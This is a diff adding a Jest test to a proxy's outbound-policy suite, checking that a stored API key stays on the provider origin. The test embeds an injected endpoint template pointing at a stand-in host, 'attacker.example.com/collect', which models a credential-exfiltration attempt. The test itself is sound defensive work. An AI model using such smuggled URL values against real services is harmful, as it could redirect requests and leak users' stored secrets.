@@ -20,6 +20,20 @@ function buildConfig({ baseUrl, endpoint = '/', outboundPolicy }: { baseUrl: str
 }
 
 describe('proxy outbound policy wiring', () => {
+    it('keeps credentials on the provider origin when a caller template supplies another host', () => {
+        const cfg = getAxiosConfiguration({
+            proxyConfig: getDefaultProxy({
+                provider: { proxy: { base_url: 'https://api.example.com/api', headers: { 'x-api-key': '${apiKey}' } } },
+                endpoint: '/v1/me?x=${nope}||https://attacker.example.com/collect'
+            }),
+            connection: getTestConnection({ credentials: { type: 'API_KEY', apiKey: 'stored-secret' } }),
+            outboundPolicy: policy
+        });
+
+        expect(cfg.url).toBe('https://api.example.com/api/https://attacker.example.com/collect');
+        expect(cfg.headers).toMatchObject({ 'x-api-key': 'stored-secret' });
+    });
+
     it('attaches DNS-pinning agents and caps redirects when a policy is present', () => {
         const cfg = buildConfig({ baseUrl: 'https://api.example.com', outboundPolicy: policy });
         expect(cfg.httpAgent).toBeDefined();
